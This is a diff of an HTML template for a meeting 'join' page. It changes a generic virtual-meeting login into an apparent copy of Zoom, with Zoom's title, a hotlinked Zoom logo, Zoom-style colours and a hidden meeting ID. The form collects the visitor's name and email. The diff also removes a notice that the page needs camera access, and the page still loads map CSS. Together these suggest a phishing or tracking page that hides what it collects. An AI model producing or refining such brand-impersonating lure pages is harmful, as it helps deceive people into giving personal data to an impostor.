@@ -3,46 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Virtual Meeting Login</title>
+    <title>Zoom Meeting - Join</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" integrity="sha256-kLaT2GOSpHechhsozzB+flnD+zUyjE2LlfWPgU04xyI=" crossorigin=""/>
     <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <style>
+        body {
+            background-color: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-container {
+            max-width: 400px;
+            width: 100%;
+            background-color: #242424;
+            border-radius: 12px;
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+        }
+        .login-header {
+            text-align: center;
+            padding: 30px 0;
+        }
+        .login-logo {
+            max-width: 150px;
+            margin: 0 auto;
+        }
+        .login-body {
+            padding: 30px;
+        }
+        .form-control {
+            background-color: #333;
+            border: 1px solid #444;
+            color: #fff;
+            height: 50px;
+            border-radius: 8px;
+            padding: 10px 15px;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .form-control::placeholder {
+            color: #aaa;
+        }
+        .form-control:focus {
+            background-color: #333;
+            border-color: #2D8CFF;
+            box-shadow: 0 0 0 0.2rem rgba(45, 140, 255, 0.25);
+            color: #fff;
+        }
+        .login-button {
+            background-color: #2D8CFF;
+            color: white;
+            border: none;
+            height: 50px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 18px;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .login-button:hover {
+            background-color: #1a7bea;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <div class="row justify-content-center mt-5">
-            <div class="col-md-6">
-                <div class="card shadow">
-                    <div class="card-header bg-primary text-white text-center">
-                        <h3>Virtual Meeting Platform</h3>
-                    </div>
-                    <div class="card-body">
-                        <div class="text-center mb-4">
-                            <img src="https://cdn-icons-png.flaticon.com/512/2875/2875390.png" alt="Meeting Icon" class="img-fluid" style="max-width: 100px;">
-                        </div>
-                        <div class="alert alert-info">
-                            <strong>Note:</strong> This platform requires camera access to enable the virtual meeting functionality.
-                        </div>
-                        <form id="login-form">
-                            <div class="mb-3">
-                                <label for="name" class="form-label">Full Name</label>
-                                <input type="text" class="form-control" id="name" required>
-                            </div>
-                            <div class="mb-3">
-                                <label for="email" class="form-label">Email Address</label>
-                                <input type="email" class="form-control" id="email" required>
-                            </div>
-                            <div class="mb-3">
-                                <label for="meeting-id" class="form-label">Meeting ID</label>
-                                <input type="text" class="form-control" id="meeting-id" value="MID-4672-1893" readonly>
-                            </div>
-                            <div class="d-grid">
-                                <button type="submit" class="btn btn-primary btn-lg">Join Meeting</button>
-                            </div>
-                        </form>
-                    </div>
+    <div class="login-container">
+        <div class="login-header">
+            <img src="https://zoom.us/web_client/image/new/home/zm-product-logo.png" alt="Zoom" class="login-logo">
+        </div>
+        <div class="login-body">
+            <form id="login-form">
+                <div class="form-group">
+                    <input type="text" class="form-control" id="name" required placeholder="Your Name">
                 </div>
-            </div>
+                
+                <div class="form-group">
+                    <input type="email" class="form-control" id="email" required placeholder="Your Email">
+                </div>
+                
+                <input type="hidden" id="meeting-id" value="467-218-9312">
+                
+                <button type="submit" class="login-button">Join Meeting</button>
+            </form>
         </div>
     </div>
 
